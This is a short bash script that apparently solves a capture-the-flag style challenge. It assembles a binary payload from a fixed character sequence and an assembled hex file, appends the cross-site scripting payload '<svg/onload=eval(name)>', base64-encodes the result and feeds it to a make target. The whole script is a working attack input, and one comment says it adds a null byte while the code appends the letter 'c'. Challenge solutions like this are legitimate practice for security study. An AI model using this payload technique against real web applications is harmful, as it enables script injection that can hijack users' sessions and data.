#!/bin/bash

# Create initial sequence with null byte
SEQ="ESNSDPCAEEIUMDTUAERH"
INITIAL=$(printf "%s\x63" "${SEQ:0:18}")

make -C assembler 

# Append the hex file contents and convert to base64
# Use printf to properly handle null bytes and special characters
INPUT=$(printf "%s%s%s" "$INITIAL" "$(cat ./assembler/bin/solve2.hex | xxd -r -p)" "<svg/onload=eval(name)>" | base64)

echo "Base64 input: $INPUT"

make run_all INPUT="${INPUT}"